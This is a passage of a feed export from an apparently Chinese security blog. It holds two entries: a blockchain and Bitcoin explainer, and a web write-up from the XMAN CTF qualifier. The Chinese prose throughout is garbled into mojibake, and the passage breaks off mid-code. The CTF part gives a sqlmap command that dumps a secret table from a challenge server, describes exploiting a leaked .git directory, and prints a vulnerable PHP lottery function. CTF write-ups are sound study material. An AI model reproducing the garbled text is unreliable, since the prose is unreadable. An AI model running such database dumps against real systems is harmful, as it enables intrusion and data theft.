åŒºå—å¤´åŒ…å«ä¸€ä¸ªéš¾åº¦ç³»æ•°,è¿™ä¸ªå€¼å†³å®šäº†hashè®¡ç®—çš„éš¾åº¦,ä¸¾ä¾‹æ¥è¯´,ç¬¬100000ä¸ªåŒºå—çš„éš¾åº¦ç³»æ•°æ˜¯14484.16236122 <img src="/images/2018/07/blockchain-1.png" alt="blacsheep" /> åŒºå—é“¾åè®®è§„å®š,ä½¿ç”¨ä¸€ä¸ªå¸¸é‡é™¤ä»¥éš¾åº¦ç³»æ•°,å¯ä»¥å¾—åˆ°ç›®æ ‡å€¼ã€‚æ˜¾ç„¶éš¾åº¦ç³»æ•°è¶Šå¤§,ç›®æ ‡å€¼å°±è¶Šå° <img src="/images/2018/07/blockchain-2.png" alt="blacsheep" /> hashçš„æœ‰æ•ˆæ€§å’Œç›®æ ‡å€¼ç›¸å…³,åªæœ‰å°äºç›®æ ‡çš„hashæ‰æ˜¯æœ‰æ•ˆçš„,å¦åˆ™hashæ— æ•ˆ,å¿…é¡»é‡ç®—ã€‚ç”±äºç›®æ ‡å€¼å¾ˆå°,hashå°äºè¯¥å€¼çš„æœºä¼šå¾ˆå°,å¯èƒ½è®¡ç®—10äº¿æ¬¡æ‰ç®—ä¸­ä¸€æ¬¡æ‰€ä»¥é‡‡çŸ¿æ…¢ å‰é¢è¯´è¿‡å½“å‰åŒºå—çš„hashç”±åŒºå—å¤´å”¯ä¸€å†³å®š,å¦‚æœå¯¹åŒæ„åŒºå—åå¤è®¡ç®—hashå°±æ„å‘³ç€åŒºå—å¤´å¿…é¡»ä¸åœå˜åŒ–,å¦åˆ™ä¸å¯èƒ½è®¡ç®—å‡ºä¸ä¸€æ ·çš„hash åŒºå—å¤´é‡Œé¢æ‰€æœ‰çš„ç‰¹å¾å€¼éƒ½æ˜¯å›ºå®šçš„,ä¸ºäº†è®©åŒºå—å¤´å‘ç”Ÿå˜åŒ–,ä¸­æœ¬èªæ•…æ„åŠ äº†ä¸€ä¸ªéšæœºé¡¹å«åšNonce Nonceæ˜¯ä¸€ä¸ªéšæœºå€¼,çŸ¿å·¥çš„ä½œç”¨å°±æ˜¯çŒœå‡ºNonce,ä½¿å¾—ç›®æ ‡hashå¯ä»¥å°äºç›®æ ‡å€¼,ä»è€Œèƒ½å¤Ÿå†™å…¥åŒºå—é“¾ã€‚ Nonceéå¸¸éš¾çŒœ,ç›®å‰åªèƒ½é€šè¿‡ç©·ä¸¾æ³•æ¥è·å–,æ ¹æ®åè®®,Nonceæ˜¯ä¸€ä¸ª32ä½çš„äºŒè¿›åˆ¶æ•°å€¼,æœ€å¤§å¯åˆ°21.47äº¿,ç¬¬100000ä¸ªåŒºå—çš„Nonceå€¼ä¸º274148111,å¯ä»¥ç†è§£æˆçŸ¿å·¥ä»0å¼€å§‹è®¡ç®—äº†2.74äº¿æ¬¡æ‰å¾—åˆ°äº†ä¸€ä¸ªæœ‰æ•ˆNonce,ä½¿å¾—hashèƒ½å¤Ÿæ»¡è¶³æ¡ä»¶ è¿æ°”å¥½çš„è¯,ä¹Ÿè®¸ä¸€ä¼šå°±èƒ½æ‰¾åˆ°Nonce,è¿æ°”ä¸å¥½çš„è¯,å¯èƒ½ç®—å®Œäº†21.47äº¿æ¬¡éƒ½æ²¡æœ‰å‘ç°Nonce,å³å½“å‰åŒºå—ä½“ä¸å¯èƒ½ç®—å‡ºæ»¡è¶³æ¡ä»¶çš„hash,è¿™æ—¶åè®®<strong>å…è®¸çŸ¿å·¥æ”¹å˜åŒºå—ä½“</strong>,å¼€å§‹æ–°çš„è®¡ç®—</p><h3 id="éš¾åº¦ç³»æ•°çš„åŠ¨æ€è°ƒèŠ‚">6.éš¾åº¦ç³»æ•°çš„åŠ¨æ€è°ƒèŠ‚</h3><p>å¦‚ä¸Šé¢æ‰€è¯´,é‡‡çŸ¿æœ‰éšæœºæ€§,æ²¡æ³•ä¿è¯æ­£å¥½10åˆ†é’Ÿäº§å‡ºä¸€ä¸ªåŒºå—,æœ‰æ—¶å€™ä¸€åˆ†é’Ÿå°±ç®—å‡ºæ¥,æœ‰æ—¶å€™å‡ ä¸ªå°æ—¶ä¹Ÿç®—ä¸å‡ºæ¥,ä¸è¿‡æ€»ä½“æ¥çœ‹,éšç€è®¾å¤‡çš„æå‡ä»¥åŠçŸ¿æœºçš„å¢åŠ ,è®¡ç®—é€Ÿåº¦ä¸€å®šè¶Šæ¥è¶Šå¿« ä¸ºäº†å°†äº§å‡ºé€Ÿåº¦æ’å®š,ä¸­æœ¬èªè®¾è®¡äº†éš¾åº¦ç³»æ•°çš„è°ƒèŠ‚æœºåˆ¶,è§„å®šæ¯ä¸¤å‘¨è°ƒèŠ‚ä¸€æ¬¡éš¾åº¦ç³»æ•°,å¦‚æœä¸¤å‘¨é‡Œé¢åŒºå—çš„ç”Ÿæˆå¹³å‡é€Ÿåº¦æ˜¯9åˆ†é’Ÿ,æ„å‘³ç€æ¯”æ³•å®šçš„å¿«äº†10%,é‚£ä¹ˆåé¢çš„éš¾åº¦ç³»æ•°å°±ä¼šè°ƒé«˜10%,å¦‚æœæ˜¯11åˆ†é’Ÿå°±ä¼šé™ä½ éš¾åº¦ç³»æ•°è¶Šé«˜,é‡‡çŸ¿è¶Šéš¾</p><h3 id="åŒºå—é“¾åˆ†å‰">7.åŒºå—é“¾åˆ†å‰</h3><p>è¿™ä¸ªé—®é¢˜å‘ç”Ÿåœ¨ä¸¤ä¸ªäººåŒæ—¶å‘åŒºå—é“¾å†™æ•°æ®,ä¹Ÿå°±æ˜¯è¯´æœ‰ä¸¤ä¸ªåŒºå—çš„åŠ å…¥,å› ä¸ºå®ƒä»¬å‰é¢éƒ½è¿æ¥ç€å‰ä¸€ä¸ªåŒºå—,ä¹Ÿå°±å½¢æˆäº†åˆ†å‰,è¿™æ—¶å€™åº”è¯¥é‡‡ç”¨å“ªä¸ªå‘¢? <img src="/images/2018/07/blockchain-3.png" alt="blacsheep" /> ç›®å‰çš„è§„åˆ™æ˜¯æ–°èŠ‚ç‚¹æ€»é‡‡ç”¨æœ€é•¿çš„é‚£æ¡åŒºå—é“¾,å¦‚æœåŒºå—é“¾æœ‰åˆ†å‰,å°†çœ‹å“ªä¸ªåˆ†æ”¯åœ¨åˆ†å‰ç‚¹åé¢å…ˆè¾¾åˆ°6ä¸ªæ–°åŒºå—(ç§°ä¸º"å…­æ¬¡ç¡®è®¤")ã€‚æŒ‰ç…§10åˆ†é’Ÿä¸€ä¸ªåŒºå—è®¡ç®—,ä¸€ä¸ªå°æ—¶å°±å¯ä»¥ç¡®è®¤ <img src="/images/2018/07/blockchain4.png" alt="blacsheep" /> æ–°åŒºå¿«çš„ç”Ÿæˆé€Ÿåº¦å†³å®šè®¡ç®—èƒ½åŠ›,è¿™ä¸ªè§„åˆ™å°±æ˜¯è¯´,æ‹¥æœ‰å¤§å¤šæ•°è®¡ç®—èƒ½åŠ›çš„é‚£ä¸ªåˆ†æ”¯å°±æ˜¯æ­£å®—çš„åŒºå—é“¾.</p><h3 id="æ€»ç»“">8.æ€»ç»“</h3><p>åŒºå—é“¾ä½œä¸ºæ— äººç®¡ç†çš„åˆ†å¸ƒå¼æ•°æ®åº“,ä»2009å¹´åˆ°ç°åœ¨è¿˜æ­£å¸¸è¿è¡Œè¯´æ˜å¯è¡Œ,ä¸è¿‡ä¸ºäº†ä¿è¯æ•°æ®çš„å¯é ,åŒºå—é“¾ä¹Ÿä»˜å‡ºäº†ä»£ä»·ã€‚ä¸€æ˜¯æ•ˆç‡,æ•°æ®å†™å…¥åŒºå—é“¾æœ€å°‘éœ€è¦10åˆ†é’Ÿ,æ‰€æœ‰èŠ‚ç‚¹éƒ½éœ€è¦åŒæ­¥,åˆ™éœ€è¦æ›´ä¹…,äºŒæ˜¯èƒ½æº,åŒºå—çš„ç”Ÿæˆéœ€è¦çŸ¿å·¥è¿›è¡Œå¤§é‡æ— æ„ä¹‰è®¡ç®—,è¿™æ˜¯éå¸¸è€—è´¹èƒ½æºçš„ æ€»ç»“æ¥çœ‹,åŒºå—é“¾çš„é€‚ç”¨åœºæ™¯å…¶å®éå¸¸æœ‰é™</p><blockquote><p>1.ä¸å­˜åœ¨æ‰€æœ‰æˆå‘˜éƒ½ç›¸ä¿¡çš„ç®¡ç†å½“å±€ 2.å†™å…¥æ•°æ®ä¸è¦æ±‚å®æ—¶ä½¿ç”¨ 3.æŒ–çŸ¿çš„æ”¶ç›Šèƒ½å¤Ÿå¼¥è¡¥è‡ªèº«æˆæœ¬</p></blockquote><p>å¦‚æœä¸è¡Œçš„è¯,ä¼ ç»Ÿçš„æ•°æ®åº“åˆ™æ˜¯æ›´å¥½çš„é€‰æ‹©.</p><h2 id="bitcoin">bitcoin</h2><p>å¤§æ¦‚äº†è§£äº†ä¸€ä¸‹åŒºå—é“¾ç›¸å…³çš„çŸ¥è¯†,ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹bitcoin</p><h3 id="éå¯¹ç§°åŠ å¯†">1.éå¯¹ç§°åŠ å¯†</h3><p>é¦–å…ˆè¦çŸ¥é“,bitcoinæ˜¯åŸºäºéå¯¹ç§°åŠ å¯†çš„,å¹³æ—¶æˆ‘ä»¬åŠ å¯†çš„æ˜æ–‡æ˜¯ä¿¡æ¯,é‚£ä¹ˆå¦‚æœè¿™ä¸ªä¿¡æ¯æ˜¯ä¸€ç¬”é’±å‘¢? æ”¯ä»˜æ–¹ç”¨ä½ çš„å…¬é’¥åŠ å¯†ä¸€ç¬”é’±,ä½ æ‰‹ä¸Šæœ‰ç§é’¥,é‚£ä¹ˆä½ å°±å¯ä»¥è§£å¼€åŠ å¯†åŒ…,åˆ«äººå·ä¸èµ°é’±,å› ä¸ºä»–ä»¬æ²¡æœ‰ä½ çš„ç§é’¥,è¿™å°±æ˜¯bitcoinçš„æœ€åŸºæœ¬çš„åŸç†,ç”±äºæ”¯ä»˜çš„é’±å¿…é¡»ç”±ç§é’¥å–å‡º,æ‰€ä»¥ä¸ç®¡ä½ æ˜¯è°,é‡è¦çš„æ˜¯è°æœ‰ç§é’¥,åªè¦æ‹¥æœ‰ç§é’¥å°±èƒ½å–å‡ºé’±(å®é™…ä¸ŠçœŸå®æµç¨‹æ˜¯ç§é’¥ä¿è¯ä½ èƒ½æŠŠè¿™äº›é’±æ”¯ä»˜å‡ºå»)</p><h3 id="bitcoiné’±åŒ…">2.bitcoiné’±åŒ…</h3><p>å¯¹äºæ¯”ç‰¹å¸æ¥è¯´,é’±ä¸æ˜¯æ”¯ä»˜ç»™ä¸ªäººçš„,è€Œæ˜¯æ”¯ä»˜ç»™æŸä¸ªç§é’¥çš„,è¿™å°±æ˜¯äº¤æ˜“åŒ¿åæ€§çš„æ ¹æœ¬åŸå› ,å› ä¸ºæ²¡æœ‰äººçŸ¥é“,é‚£äº›ç§é’¥èƒŒåçš„ä¸»äººæ˜¯è° é‚£ä¹ˆæ¯”ç‰¹å¸äº¤æ˜“çš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯ä½ å¿…é¡»æœ‰è‡ªå·±çš„å…¬é’¥å’Œç§é’¥ã€‚ ä»åè®®æ¥çœ‹,å…¬é’¥çš„é•¿åº¦æ˜¯512ä½,è¿™ä¸ªé•¿åº¦ä¸å¤ªæ–¹ä¾¿ä¼ æ’­,æ‰€ä»¥åè®®åˆä¸ºå…¬é’¥ç”Ÿæˆäº†ä¸€ä¸ª160ä½çš„æŒ‡çº¹ã€‚å°±æ˜¯æ¯”è¾ƒçŸ­çš„æ˜“äºä¼ æ’­çš„hash,160bitæ˜¯äºŒè¿›åˆ¶,å†™æˆ16è¿›åˆ¶çš„è¯å°±26-35ä¸ªå­—ç¬¦,æ¯”å¦‚1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2ã€‚è¿™ä¸ªå°±å«åšé’±åŒ…çš„åœ°å€,å®ƒæ˜¯å”¯ä¸€çš„,æ¯ä¸ªé’±åŒ…çš„åœ°å€è‚¯å®šæ˜¯ä¸ä¸€æ ·çš„ã€‚ äº¤æ˜“çš„æ—¶å€™,ä½ åªè¦ç»™åˆ«äººä½ çš„é’±åŒ…åœ°å€å³å¯,å¯¹æ–¹å‘è¿™ä¸ªåœ°å€ä»˜æ¬¾,ç”±äºä½ æ˜¯è¿™ä¸ªåœ°å€çš„æ‹¥æœ‰è€…,æ‰€ä»¥ä½ ä¼šæ”¶åˆ°è¿™ç¬”é’±,é‚£ä¹ˆå¦‚ä½•è¯æ˜ä½ æ˜¯è¿™ä¸ªåœ°å€çš„æ‹¥æœ‰è€…å‘¢?è¿™ä¸ªæ˜¯ç”±ç§é’¥è¯æ˜çš„(åé¢ä»‹ç»),æ‰€ä»¥ä¸€å®šè¦ä¿æŠ¤å¥½ç§é’¥,å¦åˆ™åˆ«äººå°±å¯ä»¥ç”¨ä½ çš„èº«ä»½æŠŠé’±åŒ…é‡Œçš„é’±éƒ½è½¬èµ°äº†</p><h3 id="äº¤æ˜“è¿‡ç¨‹">3.äº¤æ˜“è¿‡ç¨‹</h3><p>å…·ä½“æ¥çœ‹å°±æ˜¯<strong>æŠŠä¸€ä¸ªåœ°å€çš„bitcoinè½¬åˆ°å¦å¤–ä¸€ä¸ªåœ°å€ã€‚</strong>ç”±äºæ¯”ç‰¹å¸çš„äº¤æ˜“å…¨éƒ¨éƒ½æ˜¯å…¬å¼€çš„,å“ªä¸ªåœ°å€æ‹¥æœ‰å¤šå°‘æ¯”ç‰¹å¸éƒ½æ˜¯å¯ä»¥æŸ¥å¾—åˆ°çš„ã€‚å› æ­¤,æ”¯ä»˜æ–¹æ˜¯å¦æœ‰è¶³å¤Ÿçš„æ¯”ç‰¹å¸æ¥è¿›è¡Œæ”¯ä»˜ä¹Ÿæ˜¯å¯ä»¥éªŒè¯çš„ é—®é¢˜åœ¨äºå¦‚ä½•å»é˜²æ­¢å…¶ä»–äººå†’ç”¨ä½ çš„åä¹‰å»ç”³æŠ¥äº¤æ˜“,ä¹Ÿå°±æ˜¯è¯´,åœ°å€Aå‘Bæ”¯ä»˜10ä¸ªæ¯”ç‰¹å¸,æˆ‘æ€ä¹ˆçŸ¥é“è¿™ä¸ªç”³æŠ¥æ˜¯çœŸçš„,ç”³æŠ¥äººå°±æ˜¯A æ¯”ç‰¹å¸åè®®è§„å®š,ç”³æŠ¥äº¤æ˜“çš„æ—¶å€™é™¤äº†äº¤æ˜“é‡‘é¢ä»¥å¤–,è½¬å‡ºä¸€æ–¹è¿˜è¦æä¾›ä»¥ä¸‹æ•°æ®</p><blockquote><p>1.ä¸Šä¸€ç¬”äº¤æ˜“çš„hash 2.æœ¬æ¬¡äº¤æ˜“åŒæ–¹çš„åœ°å€ 3.æ”¯ä»˜æ–¹çš„å…¬é’¥ 4.æ”¯ä»˜æ–¹ç§é’¥ç”Ÿæˆçš„æ•°å­—ç­¾å</p></blockquote><p>éªŒè¯çš„æ—¶å€™</p><blockquote><p>1.æ‰¾åˆ°ä¸Šä¸€ç¬”äº¤æ˜“,ç¡®è®¤æ”¯ä»˜æ–¹çš„æ¯”ç‰¹å¸æ¥æº 2.ç®—å‡ºæ”¯ä»˜æ–¹å…¬é’¥çš„æŒ‡çº¹,ç¡®è®¤å’Œæ”¯ä»˜æ–¹ä¸€è‡´,ä»è€Œä¿è¯å…¬é’¥å±å® 3.ç”¨å…¬é’¥å»è§£å¼€æ•°å­—ç­¾å,ä¿è¯ç§é’¥å±å®</p></blockquote><h3 id="äº¤æ˜“ç¡®è®¤å’ŒåŒºå—é“¾">4.äº¤æ˜“ç¡®è®¤å’ŒåŒºå—é“¾</h3><p>ç¡®è®¤äº¤æ˜“çš„çœŸå®æ€§ä¹‹å,äº¤æ˜“è¿˜ä¸ç®—ç»“æŸã€‚äº¤æ˜“çš„æ•°æ®å¿…é¡»å†™å…¥æ•°æ®åº“æ‰ç®—æˆç«‹,å¯¹æ–¹æ‰èƒ½çœŸæ­£çš„æ”¶åˆ°é’±ã€‚ é¦–å…ˆæ‰€æœ‰çš„äº¤æ˜“éƒ½ä¼šä¼ é€åˆ°çŸ¿å·¥é‚£é‡Œ,çŸ¿å·¥è´Ÿè´£æŠŠè¿™äº›äº¤æ˜“å†™å…¥åŒºå—é“¾ã€‚ æ ¹æ®æ¯”ç‰¹å¸åè®®,ä¸€ä¸ªåŒºå—çš„å¤§å°æœ€å¤§æ˜¯1MB,è€Œä¸€ç¬”äº¤æ˜“å¤§æ¦‚æ˜¯500å­—èŠ‚å·¦å³,å› æ­¤ä¸€ä¸ªåŒºå—æœ€å¤šå¯ä»¥åŒ…å«2000å¤šç¬”äº¤æ˜“ã€‚çŸ¿å·¥è´Ÿè´£æŠŠ2000å¤šç¬”äº¤æ˜“æ‰“åŒ…,ç»„æˆä¸€ä¸ªåŒºå—ç„¶åè®¡ç®—åŒºå—çš„hash(é‡‡çŸ¿),è¿™ä¸ªè¿‡ç¨‹æ˜¯çŸ¿å·¥ä¹‹é—´çš„ç«äº‰,è°å…ˆç®—å‡ºhashå°±å¯ä»¥å†™å…¥æ•°æ®,ä»è€Œäº«å—è¿™ä¸ªåŒºå—çš„æ‰€æœ‰åˆ©ç›Š,å…¶ä»–çŸ¿å·¥å°±å°†ä¸€æ— æ‰€è·. è¿™é‡Œæ³¨æ„æˆ‘ä»¬å‰é¢è¯´åˆ°çš„,ä¸€ç¬”äº¤æ˜“ä¸€æ—¦å†™å…¥äº†åŒºå—é“¾å°±æ— æ³•åæ‚”äº†,æ¯”ç‰¹å¸ä¸å­˜æ”¾åœ¨é’±åŒ…æˆ–è€…å…¶ä»–åˆ«çš„åœ°æ–¹,è€Œæ˜¯åªå­˜åœ¨åŒºå—é“¾ä¸Š,ç”±åŒºå—é“¾è®°å½•ä½ æ¯ä¸€ç¬”äº¤æ˜“,ä½ å¾—åˆ°è¿‡å¤šå°‘,æ”¯å‡ºè¿‡å¤šå°‘,æœ€ç»ˆç®—å‡ºä½ æ‹¥æœ‰å¤šå°‘èµ„é‡‘</p><h3 id="çŸ¿å·¥æ”¶ç›Š">5.çŸ¿å·¥æ”¶ç›Š</h3><p>äº¤æ˜“ç¦»ä¸å¼€çŸ¿å·¥,é‚£ä¹ˆè°æ„¿æ„åšçŸ¿å·¥å‘¢? æ¯”ç‰¹å¸åè®®è§„å®š,æŒ–åˆ°æ–°çš„åŒºå—çš„çŸ¿å·¥å°†è·å¾—å¥–åŠ±,ä¸€å¼€å§‹æ˜¯50ä¸ªæ¯”ç‰¹å¸,ç„¶åæ¯4å¹´å‡åŠ,ç›®å‰æ˜¯12.5ä¸ªæ¯”ç‰¹å¸,è¿™ä¹Ÿæ˜¯æ¯”ç‰¹å¸çš„ä¾›ç»™å¢åŠ æœºåˆ¶,æµé€šä¸­çš„æ¯”ç‰¹å¸éƒ½æ˜¯è¿™ä¹ˆäº§ç”Ÿçš„ è™½ç„¶æŒ‰è¿™ç§è®¡ç®—,2140å¹´å°±ä¸ä¼šå†äº§ç”Ÿæ¯”ç‰¹å¸äº†,çŸ¿å·¥å°±å°†æ— æ³•è·å¾—å¥–åŠ±äº†,é‚£ä¹ˆæ¯”ç‰¹å¸çš„æ•°é‡ä¹Ÿå°±åœæ­¢å¢åŠ äº†,çŸ¿å·¥ä¹Ÿåªèƒ½ä»æ‰‹ç»­è´¹ä¸­è·å¾—æ¯”ç‰¹å¸äº† äº¤æ˜“çš„æ—¶å€™çŸ¿å·¥å¯ä»¥ä»æ¯ç¬”äº¤æ˜“æŠ½æˆ,å…·ä½“é‡‘é¢ç”±æ”¯ä»˜æ–¹è‡ªæ„¿å†³å®š,ä½ å¯ä»¥é€‰æ‹©æ”¯ä»˜é«˜é¢,é‚£ä¹ˆä¼šè¢«ä¼˜å…ˆå¤„ç†,ä¹Ÿå¯ä»¥ä¸ç»™ä»»ä½•é‡‘é¢,é‚£ä¹ˆä½ çš„äº¤æ˜“ä¹Ÿä¸ä¼šè¢«çŸ¿å·¥æ‰€å¤„ç†.</p><h3 id="åŒºå—æ‰©å®¹">åŒºå—æ‰©å®¹</h3><p>æ¯”ç‰¹å¸åè®®è§„å®š,æ¯10åˆ†é’Ÿäº§ç”Ÿä¸€ä¸ªåŒºå—,åŒºå—çš„å¤§å°åªæœ‰1MB,æœ€å¤šåªèƒ½åŒ…å«2000å¤šç¬”äº¤æ˜“,ä¹Ÿå°±æ˜¯è¯´,æ¯”ç‰¹å¸ç½‘ç»œæ¯10åˆ†é’Ÿ,æœ€å¤šåªèƒ½å¤„ç†2000å¤šç¬”äº¤æ˜“,æ¢ç®—ä¸€ä¸‹,å°±æ˜¯å¤„ç†é€Ÿåº¦æ˜¯3~5ç¬”/ç§’ å…¨ä¸–ç•Œçš„äº¤æ˜“é‚£ä¹ˆå¤š,å¤„ç†çš„é€Ÿåº¦åˆè¿™ä¹ˆæ…¢,è¿™å·²ç»æˆä¸ºäº†åˆ¶çº¦æ¯”ç‰¹å¸å‘å±•çš„ç“¶é¢ˆäº† åæ¥æœ‰äººå‘¼åè¯´æ”¹é©æ¯”ç‰¹å¸åè®®,å¢åŠ å¤„ç†é€Ÿåº¦,åœ¨2017å¹´8æœˆæ—¶,åŒºå—é“¾å‘ç”Ÿäº†ä¸€æ¬¡åˆ†å‰,è¯ç”Ÿäº†ä¸€ä¸ªæ–°çš„åè®®,æˆä¸ºBitcoin Cash,è¿™ä¸ªè´§å¸å…¶ä»–æ–¹é¢å’Œæ¯”ç‰¹å¸ä¸€è‡´,ä½†æ˜¯å°±æ˜¯åŒºå—çš„å¤§å°ä»1MBå˜æˆäº†8MB,å¤„ç†é€Ÿåº¦å˜æˆäº†åŸæ¥çš„8å€,æ‰‹ç»­è´¹ä¹Ÿä½äº†å¾ˆå¤š,è¿™ä¸ªåè®®æ˜¯å¯¹åŸæœ‰åŒºå—é“¾çš„åˆ†å‰,æ‰€ä»¥å½“æ—¶æŒæœ‰æ¯”ç‰¹å¸çš„äººç­‰äºä¸€äººè·èµ ä¸€ä»½åŒæ ·æ•°é‡çš„BCH</p><h3 id="æœ€å">æœ€å</h3><p>é‚£ä¹ˆåˆ°è¿™é‡Œæ¯”ç‰¹å¸åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢?å®ƒå…¶å®å°±æ˜¯ä¸€ä¸ªè®°å½•,å‡­ç©ºäº§ç”Ÿçš„è®°å½•,ä¸¾ä¸ªä¾‹å­,çŸ¿å·¥è·å¾—12.5ä¸ªæ¯”ç‰¹å¸çš„å¥–åŠ±,é‚£ä¹ˆåŒºå—é“¾å°±ä¼šæœ‰ä¸€ä¸ªè®°å½•:"xxxåœ°å€è·å¾—12.5ä¸ªæ¯”ç‰¹å¸"ã€‚æ­£æ˜¯è¿™äº›è®°å½•å¯¼è‡´çŸ¿å·¥è·å¾—äº†å¤§ç¬”é‡‘é’±,å¦‚æœåŒºå—é“¾çªç„¶å¢åŠ äº†ä¸€æ¡è®°å½•,è®°è½½ä½ è·å¾—äº†1000æ¯”ç‰¹å¸,é‚£ä¹ˆä½ å°±çœŸçš„æœ‰1000æ¯”ç‰¹å¸(è™½ç„¶å¹¶ä¸ä¼š,è¿™åªæ˜¯ä¸¾ä¸ªä¾‹å­) å‚è€ƒé“¾æ¥: <a href="http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html" title="http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html">http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html</a> <a href="http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html" title="http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html">http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xmané€‰æ‹”èµ›webéƒ¨åˆ†</title>
      <link href="/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/"/>
      <url>/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>æš‘å‡ç¬¬ä¸€åœºæ¯”èµ›,åšäº†ä¸ªwebéƒ¨åˆ†,ç®€å•å†™ä¸‹</p><h3 id="newscenter">NewsCenter</h3><p><strong>æè¿°:This is to0 s1mple</strong> åœ°å€:<a href="http://47.96.118.255:8888/" title="http://47.96.118.255:8888/">http://47.96.118.255:8888/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://47.96.118.255:33066/&quot; --data &quot;search=2&quot; -D news -T secret_table --dump</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/07/1-3.jpg" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 id="lottery">Lottery</h3><p><strong>æ²¡æœ‰æè¿°...</strong> <a href="http://47.96.118.255:8888/" title="http://47.96.118.255:8888/">http://47.96.118.255:8888/</a> éšæ„çœ‹ä¸‹,å‘ç°.gitæ³„æ¼,githackä¸€ä¸‹,å‘ç°æ²¡æ–‡ä»¶,git logä¸€ä¸‹ç„¶åreset --hard <img src="/images/2018/07/2-1.jpg" alt="blacsheep" /> å…³é”®ä»£ç api.php,çœ‹åˆ°åˆ¤æ–­å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">require_registered</span>();</span><br><span class="line">    <span class="title function_ invoke__">require_min_money</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">    <span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">    <span class="variable">$win_numbers</span> = <span class="title function_ invoke__">random_win_nums</span>();</span><br><span class="line">    <span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$same_count</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">    <span class="title function_ invoke__">response</span>([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span 